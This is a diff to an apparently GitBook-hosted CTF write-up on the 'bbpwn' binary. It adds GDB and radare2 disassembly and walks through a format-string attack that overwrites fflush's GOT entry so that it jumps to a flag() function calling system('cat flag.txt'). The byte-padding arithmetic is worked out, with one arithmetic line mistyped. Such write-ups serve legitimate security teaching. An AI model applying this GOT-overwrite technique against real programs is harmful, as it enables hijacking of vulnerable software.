@@ -24,11 +24,24 @@ $ checksec bbpwn
 
 We see that there is no canary and no PIE. This means that this code is subject to buffer overflows.
 
-We perform our routine checks in search of anything outstanding. I chose for this binary to load it into `radare2` rather than `gdb`. `gdb` works just fine but `radare2` performs particularly well on the binary because of the number of strings and functions.
+We perform our routine checks in search of anything outstanding. 
+
+{% hint style="info" %}
+The original writeup for this challenges uses `radare2`.  `gdb` commands were added later.
+{% endhint %}
 
 {% tabs %}
 {% tab title="GDB" %}
+```nasm
+gef➤  info functions
+All defined functions:
 
+Non-debugging symbols:
+...
+0x0804870b  flag()
+0x08048724  main
+...
+```
 {% endtab %}
 
 {% tab title="Radare2" %}
@@ -48,7 +61,23 @@ We first check `flag` to make sure we don't have anything to do inside the funct
 
 {% tabs %}
 {% tab title="GDB" %}
-
+```nasm
+gef➤  disas flag
+Dump of assembler code for function _Z4flagv:
+   0x0804870b <+0>:	push   ebp
+   0x0804870c <+1>:	mov    ebp,esp
+   0x0804870e <+3>:	sub    esp,0x8
+   0x08048711 <+6>:	sub    esp,0xc
+   0x08048714 <+9>:	push   0x80488e0
+   0x08048719 <+14>:	call   0x8048570 <system@plt>
+   0x0804871e <+19>:	add    esp,0x10
+   0x08048721 <+22>:	nop
+   0x08048722 <+23>:	leave  
+   0x08048723 <+24>:	ret    
+End of assembler dump.
+gef➤  x/s 0x80488e0
+0x80488e0:	"cat flag.txt"
+```
 {% endtab %}
 
 {% tab title="Radare2" %}
@@ -73,7 +102,73 @@ We see that this function just calls `system("cat flag.txt");` without any extra
 
 {% tabs %}
 {% tab title="GDB" %}
-
+```nasm
+gef➤  disas main
+Dump of assembler code for function main:
+   0x08048724 <+0>:	lea    ecx,[esp+0x4]
+   0x08048728 <+4>:	and    esp,0xfffffff0
+   0x0804872b <+7>:	push   DWORD PTR [ecx-0x4]
+   0x0804872e <+10>:	push   ebp
+   0x0804872f <+11>:	mov    ebp,esp
+   0x08048731 <+13>:	push   ecx
+   0x08048732 <+14>:	sub    esp,0x214
+   0x08048738 <+20>:	mov    eax,ecx
+   0x0804873a <+22>:	mov    eax,DWORD PTR [eax+0x4]
+   0x0804873d <+25>:	mov    DWORD PTR [ebp-0x20c],eax
+   0x08048743 <+31>:	mov    eax,gs:0x14
+   0x08048749 <+37>:	mov    DWORD PTR [ebp-0xc],eax
+   0x0804874c <+40>:	xor    eax,eax
+   0x0804874e <+42>:	sub    esp,0xc
+   0x08048751 <+45>:	push   0x80488f0
+   0x08048756 <+50>:	call   0x80485e0 <puts@plt>
+   0x0804875b <+55>:	add    esp,0x10
+   0x0804875e <+58>:	mov    eax,ds:0x804a044
+   0x08048763 <+63>:	sub    esp,0xc
+   0x08048766 <+66>:	push   eax
+   0x08048767 <+67>:	call   0x80485c0 <fflush@plt>
+   0x0804876c <+72>:	add    esp,0x10
+   0x0804876f <+75>:	mov    eax,ds:0x804a040
+   0x08048774 <+80>:	mov    edx,0xc8
+   0x08048779 <+85>:	sub    esp,0x4
+   0x0804877c <+88>:	push   eax
+   0x0804877d <+89>:	push   edx
+   0x0804877e <+90>:	lea    eax,[ebp-0x200]
+   0x08048784 <+96>:	push   eax
+   0x08048785 <+97>:	call   0x8048590 <fgets@plt>
+   0x0804878a <+102>:	add    esp,0x10
+   0x0804878d <+105>:	mov    eax,ds:0x804a040
+   0x08048792 <+110>:	sub    esp,0xc
+   0x08048795 <+113>:	push   eax
+   0x08048796 <+114>:	call   0x80485c0 <fflush@plt>
+   0x0804879b <+119>:	add    esp,0x10
+   0x0804879e <+122>:	sub    esp,0x4
+   0x080487a1 <+125>:	lea    eax,[ebp-0x200]
+   0x080487a7 <+131>:	push   eax
+   0x080487a8 <+132>:	push   0x8048914
+   0x080487ad <+137>:	lea    eax,[ebp-0x138]
+   0x080487b3 <+143>:	push   eax
+   0x080487b4 <+144>:	call   0x8048550 <sprintf@plt>
+   0x080487b9 <+149>:	add    esp,0x10
+   0x080487bc <+152>:	mov    eax,ds:0x804a044
+   0x080487c1 <+157>:	sub    esp,0xc
+   0x080487c4 <+160>:	push   eax
+   0x080487c5 <+161>:	call   0x80485c0 <fflush@plt>
+   0x080487ca <+166>:	add    esp,0x10
+   0x080487cd <+169>:	sub    esp,0xc
+   0x080487d0 <+172>:	lea    eax,[ebp-0x138]
+   0x080487d6 <+178>:	push   eax
+   0x080487d7 <+179>:	call   0x80485d0 <printf@plt>
+   0x080487dc <+184>:	add    esp,0x10
+   0x080487df <+187>:	mov    eax,ds:0x804a044
+   0x080487e4 <+192>:	sub    esp,0xc
+   0x080487e7 <+195>:	push   eax
+   0x080487e8 <+196>:	call   0x80485c0 <fflush@plt>
+   0x080487ed <+201>:	add    esp,0x10
+   0x080487f0 <+204>:	sub    esp,0xc
+   0x080487f3 <+207>:	push   0x1
+   0x080487f5 <+209>:	call   0x80485f0 <exit@plt>
+End of assembler dump.
+```
 {% endtab %}
 
 {% tab title="Radare2" %}
@@ -196,9 +291,16 @@ GOT protection: Partial RelRO | GOT functions: 11
 {% endtab %}
 
 {% tab title="Radare2" %}
-
+```nasm
+[0xf7f448a0]> pxw 4 @ reloc.fflush
+0x0804a028  0x080485c6                                   ....
+```
 {% endtab %}
 {% endtabs %}
+
+{% hint style="info" %}
+For the radare2 output, we can also use `pdf @ sym.imp.fflush` to see the address of the function. This shows us the PLT entry, which jumps us to the address in the GOT (`reloc.fflush`).
+{% endhint %}
 
 In the `got` table, `fflush` is at `0x0804a028`. We can verify this by checking the address for an instruction:
 
@@ -211,7 +313,12 @@ gef➤  x/i 0x804a028
 {% endtab %}
 
 {% tab title="Radare2" %}
-
+```nasm
+[0xf7f448a0]> pd 1 @ reloc.fflush
+            ;-- reloc.fflush:
+            ; DATA XREF from sym.imp.fflush @ 0x80485c0(x)
+            0x0804a028      c6850408d685.  mov byte [ebp - 0x7a29f7fc], 4; RELOC 32 fflush
+```
 {% endtab %}
 {% endtabs %}
 
@@ -229,7 +336,11 @@ Non-debugging symbols:
 {% endtab %}
 
 {% tab title="Radare2" %}
-
+```nasm
+[0xf7f448a0]> afl | grep flag
+0x0804883c    1     26 sym._GLOBAL__sub_I__Z4flagv
+0x0804870b    1     25 sym.flag__
+```
 {% endtab %}
 {% endtabs %}
 
@@ -252,20 +363,12 @@ gdb.attach(p, gdbscript='b *(main+184)')
 
 Checking the addresses at `fflush`:
 
-{% tabs %}
-{% tab title="GDB" %}
 ```nasm
 gef➤  x/2wx 0x0804a028
 0x804a028 <fflush@got.plt>:	0x52005252	0xf7000000
 ```
-{% endtab %}
 
-{% tab title="Radare2" %}
-
-{% endtab %}
-{% endtabs %}
-
-We see that the current value is `0x52` at the lowest byte. Remember that we can only really _add_ to the value, meaning to get `0x0b` at that byte, we need to reach `0x10b`. This takes `0x10b-0x52=185` bytes. Therefore, we can append `%185x` into our payload so that many bytes are written first.
+We see that the current value is `0x52` at the lowest byte. Remember that we can only _add_ to the value, meaning to get `0x0b` at that byte, we need to reach `0x10b`. This takes `0x10b-0x52=185` bytes. Therefore, we can append `%185x` into our payload so that many bytes are written first.
 
 {% hint style="warning" %}
 #### _Why does this work?_
@@ -299,33 +402,17 @@ payload = addrs + formats
 Remember that `%n` prints the number of bytes written thus far. If we write spaces, we add another byte to the count. In theory, we could subtract one from the hex format specifier, but this is less confusing.
 {% endhint %}
 
-{% tabs %}
-{% tab title="GDB" %}
 ```nasm
 gef➤  x/2wx 0x0804a028
 0x804a028 <fflush@got.plt>:	0x0b010b0b	0xf7000001
 ```
-{% endtab %}
-
-{% tab title="Radare2" %}
-
-{% endtab %}
-{% endtabs %}
 
 The lower byte is now `0x0b` as desired. Now, let's do the second and third bytes similarly. Our current bytes are `0x010b`, and we need this to be `0x0487`. `0x0847-0x010b=892`. We can add `%892x` to the format string to write that many bytes. This changes the value at that address to:
 
-{% tabs %}
-{% tab title="GDB" %}
 ```nasm
 gef➤  x/2wx 0x0804a028
 0x804a028 <fflush@got.plt>: 0x8704870b	0xf7000004
 ```
-{% endtab %}
-
-{% tab title="Radare2" %}
-
-{% endtab %}
-{% endtabs %}
 
 Finally, to modify the fourth bit, we need to write `0x08` to the fourth byte, which requires `0x108-0x87=129` bytes to be written. This will spill over to the next DWORD, but that's okay because it doesn't prevent us from pulling off this exploit.
 
